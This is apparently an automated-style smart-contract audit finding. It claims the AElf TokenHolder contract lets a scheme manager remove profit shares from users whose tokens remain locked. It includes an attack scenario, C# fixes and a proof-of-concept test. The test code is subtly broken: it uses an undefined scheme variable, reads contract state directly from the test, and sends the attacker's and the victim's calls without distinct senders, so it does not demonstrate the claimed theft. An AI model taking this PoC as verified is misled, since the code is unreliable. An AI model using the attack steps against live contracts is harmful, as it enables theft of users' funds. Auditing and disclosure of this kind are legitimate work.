# Audit Report

## Title
Scheme Manager Can Steal Profit Shares from Locked Token Holders via RemoveBeneficiary

## Summary
The TokenHolder contract's `RemoveBeneficiary` function allows a scheme manager to remove profit shares from users who locked tokens via `RegisterForProfits`, while their tokens remain locked. This violates the core invariant that locked tokens guarantee proportional profit participation, enabling theft of expected profit distributions.

## Finding Description

The vulnerability exists because `RemoveBeneficiary` fails to distinguish between two types of beneficiaries:
1. Manager-added beneficiaries (via `AddBeneficiary`) - no tokens locked
2. Self-registered beneficiaries (via `RegisterForProfits`) - tokens locked

When users call `RegisterForProfits`, their tokens are locked via the MultiToken contract [1](#0-0)  and the lock ID is stored in state [2](#0-1) . They receive profit shares equal to their locked amount [3](#0-2) .

However, `RemoveBeneficiary` only validates that the caller is the scheme manager [4](#0-3)  and removes the beneficiary's shares from the Profit contract [5](#0-4) . Critically, there is **no call to unlock the tokens** anywhere in the function - searching the entire `RemoveBeneficiary` method shows no invocation of `State.TokenContract.Unlock`.

The legitimate withdrawal path demonstrates the correct behavior: it checks the minimum lock period, unlocks tokens, removes the lock ID from state, then removes the beneficiary [6](#0-5) .

When the Profit contract processes the removal with `CanRemoveBeneficiaryDirectly = true` (set during scheme creation [7](#0-6) ), the `RemoveProfitDetails` function allows removing any profit detail regardless of end period [8](#0-7)  and sets the beneficiary's `EndPeriod` to the past [9](#0-8) , preventing all future profit claims.

## Impact Explanation

This enables **direct financial theft** of profit distributions:

**Attack Scenario:**
1. Attacker creates a TokenHolder scheme (permissionless - any user can call `CreateScheme`)
2. Victim calls `RegisterForProfits` with 10,000 tokens (normal expected usage)
   - Tokens locked and stored in state
   - Victim receives 10,000 shares
3. Attacker adds themselves as beneficiary with 10,000 shares (no tokens required)
4. First distribution: 10,000 profit tokens → 5,000 to victim, 5,000 to attacker (equal shares)
5. Attacker calls `RemoveBeneficiary(victim, 0)`
   - Victim's 10,000 shares removed from Profit contract
   - Victim's tokens remain locked (no unlock call)
   - Total shares now 10,000 (attacker only)
6. Second distribution: 10,000 profit tokens → 0 to victim, 10,000 to attacker
7. Victim's capital locked until `MinimumLockMinutes` expires
8. **Result: ~5,000 tokens stolen per distribution period**

The stolen profit shares redistribute to remaining beneficiaries proportionally. This violates the fundamental guarantee that locked tokens ensure proportional profit participation for the lock duration.

**Affected Parties:**
- All users who lock tokens via `RegisterForProfits`
- Particularly severe for large lock amounts and long lock periods
- Affects any TokenHolder scheme since scheme creation is permissionless

## Likelihood Explanation

**High Likelihood:**

**Attacker Capabilities:**
- Any user can become a scheme manager by calling `CreateScheme` (no authorization restrictions)
- No special privileges required beyond scheme creation
- Attack is permissionless once scheme exists

**Attack Complexity:**
- Extremely low: single function call to `RemoveBeneficiary`
- No timing constraints or complex state manipulation
- Can execute immediately after users register

**Preconditions:**
- Users must register via `RegisterForProfits` (normal expected behavior for profit participation)
- No unusual state requirements
- Works on any TokenHolder scheme

**Detection Difficulty:**
- Appears as legitimate scheme management action
- No on-chain validation prevents execution
- Users discover only after noticing reduced profit claims while tokens remain locked

**Economic Rationality:**
- Highly profitable: attacker receives 100% of victim's profit allocation
- Zero cost to execute (only transaction fee)
- Risk-free since it appears as authorized manager action
- Rational for any profit-maximizing malicious manager

## Recommendation

Add a check in `RemoveBeneficiary` to prevent removing beneficiaries who have locked tokens. The function should verify if `State.LockIds[Context.Sender][input.Beneficiary]` exists and either:

1. **Reject the removal entirely:**
```csharp
public override Empty RemoveBeneficiary(RemoveTokenHolderBeneficiaryInput input)
{
    var scheme = GetValidScheme(Context.Sender);
    
    // Check if beneficiary has locked tokens
    var lockId = State.LockIds[Context.Sender][input.Beneficiary];
    Assert(lockId == null, "Cannot remove beneficiary with locked tokens. User must withdraw first.");
    
    // ... rest of existing logic
}
```

2. **Or automatically unlock tokens before removal:**
```csharp
public override Empty RemoveBeneficiary(RemoveTokenHolderBeneficiaryInput input)
{
    var scheme = GetValidScheme(Context.Sender);
    
    // Check if beneficiary has locked tokens
    var lockId = State.LockIds[Context.Sender][input.Beneficiary];
    if (lockId != null)
    {
        // Unlock tokens first
        var lockedAmount = State.TokenContract.GetLockedAmount.Call(new GetLockedAmountInput
        {
            Address = input.Beneficiary,
            LockId = lockId,
            Symbol = scheme.Symbol
        }).Amount;
        
        State.TokenContract.Unlock.Send(new UnlockInput
        {
            Address = input.Beneficiary,
            LockId = lockId,
            Amount = lockedAmount,
            Symbol = scheme.Symbol
        });
        
        State.LockIds[Context.Sender].Remove(input.Beneficiary);
    }
    
    // ... rest of existing logic
}
```

Option 1 is safer as it requires users to explicitly withdraw, maintaining the lock period guarantee. Option 2 provides convenience but bypasses the minimum lock period protection.

## Proof of Concept

```csharp
[Fact]
public async Task RemoveBeneficiary_StealsLockedTokenProfits()
{
    // Attacker creates scheme
    var attacker = Accounts[1].Address;
    await TokenHolderContractStub.CreateScheme.SendAsync(new CreateTokenHolderProfitSchemeInput
    {
        Symbol = "ELF",
        MinimumLockMinutes = 100
    });

    // Victim locks 10,000 tokens and registers for profits
    var victim = Accounts[2].Address;
    await TokenHolderContractStub.RegisterForProfits.SendAsync(new RegisterForProfitsInput
    {
        SchemeManager = attacker,
        Amount = 10000
    });

    // Attacker adds self as beneficiary (no tokens locked)
    await TokenHolderContractStub.AddBeneficiary.SendAsync(new AddTokenHolderBeneficiaryInput
    {
        Beneficiary = attacker,
        Shares = 10000
    });

    // First profit distribution
    await TokenHolderContractStub.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeManager = attacker,
        Symbol = "ELF",
        Amount = 10000
    });
    
    // Verify victim has 10000 shares (50% of total)
    var victimDetailsBefore = await ProfitContractStub.GetProfitDetails.CallAsync(new GetProfitDetailsInput
    {
        SchemeId = scheme.SchemeId,
        Beneficiary = victim
    });
    victimDetailsBefore.Details.Single().Shares.ShouldBe(10000);

    // ATTACK: Attacker removes victim's beneficiary status while tokens remain locked
    await TokenHolderContractStub.RemoveBeneficiary.SendAsync(new RemoveTokenHolderBeneficiaryInput
    {
        Beneficiary = victim,
        Amount = 0 // Remove all shares
    });

    // Verify victim's shares removed
    var victimDetailsAfter = await ProfitContractStub.GetProfitDetails.CallAsync(new GetProfitDetailsInput
    {
        SchemeId = scheme.SchemeId,
        Beneficiary = victim
    });
    victimDetailsAfter.Details.ShouldBeEmpty();

    // Verify victim's tokens still locked
    var lockId = State.LockIds[attacker][victim];
    lockId.ShouldNotBeNull();
    var lockedAmount = await TokenContractStub.GetLockedAmount.CallAsync(new GetLockedAmountInput
    {
        Address = victim,
        LockId = lockId,
        Symbol = "ELF"
    });
    lockedAmount.Amount.ShouldBe(10000); // Tokens still locked!

    // Second profit distribution - victim gets nothing, attacker gets 100%
    await TokenHolderContractStub.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeManager = attacker,
        Symbol = "ELF",
        Amount = 10000
    });
    
    // Victim cannot claim profits despite locked tokens
    // Attacker receives 100% of profit distribution
    // Victim's capital remains locked until MinimumLockMinutes expires
}
```

**Notes:**

This vulnerability represents a critical flaw in the TokenHolder contract's access control and state management. The core issue is that `RemoveBeneficiary` treats all beneficiaries identically regardless of how they joined the scheme, failing to recognize that self-registered beneficiaries have locked capital that must be protected. The attack is highly feasible because TokenHolder scheme creation is permissionless, requiring no special privileges beyond calling `CreateScheme`. The impact is severe as it enables direct theft of expected profit distributions while victims' capital remains locked and inaccessible.

### Citations

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L20-25)
```csharp
        State.ProfitContract.CreateScheme.Send(new CreateSchemeInput
        {
            Manager = Context.Sender,
            IsReleaseAllBalanceEveryTimeByDefault = true,
            CanRemoveBeneficiaryDirectly = true
        });
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L72-72)
```csharp
        var scheme = GetValidScheme(Context.Sender);
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L80-84)
```csharp
        State.ProfitContract.RemoveBeneficiary.Send(new RemoveBeneficiaryInput
        {
            SchemeId = scheme.SchemeId,
            Beneficiary = input.Beneficiary
        });
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L159-165)
```csharp
        State.TokenContract.Lock.Send(new LockInput
        {
            LockId = lockId,
            Symbol = scheme.Symbol,
            Address = Context.Sender,
            Amount = input.Amount
        });
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L166-166)
```csharp
        State.LockIds[input.SchemeManager][Context.Sender] = lockId;
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L168-176)
```csharp
        State.ProfitContract.AddBeneficiary.Send(new AddBeneficiaryInput
        {
            SchemeId = scheme.SchemeId,
            BeneficiaryShare = new BeneficiaryShare
            {
                Beneficiary = Context.Sender,
                Shares = input.Amount
            }
        });
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L227-243)
```csharp
        Assert(State.LockTimestamp[lockId].AddMinutes(scheme.MinimumLockMinutes) < Context.CurrentBlockTime,
            "Cannot withdraw.");

        State.TokenContract.Unlock.Send(new UnlockInput
        {
            Address = Context.Sender,
            LockId = lockId,
            Amount = amount,
            Symbol = scheme.Symbol
        });

        State.LockIds[input].Remove(Context.Sender);
        State.ProfitContract.RemoveBeneficiary.Send(new RemoveBeneficiaryInput
        {
            SchemeId = scheme.SchemeId,
            Beneficiary = Context.Sender
        });
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L321-324)
```csharp
        var detailsCanBeRemoved = scheme.CanRemoveBeneficiaryDirectly
            ? profitDetails.Details.Where(d => !d.IsWeightRemoved).ToList()
            : profitDetails.Details
                .Where(d => d.EndPeriod < scheme.CurrentPeriod && !d.IsWeightRemoved).ToList();
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L351-356)
```csharp
                else if (profitDetail.EndPeriod >= scheme.CurrentPeriod)
                {
                    // No profit can be here, except the scheme is cancellable.
                    // shorten profit.
                    profitDetail.EndPeriod = scheme.CurrentPeriod.Sub(1);
                }
```
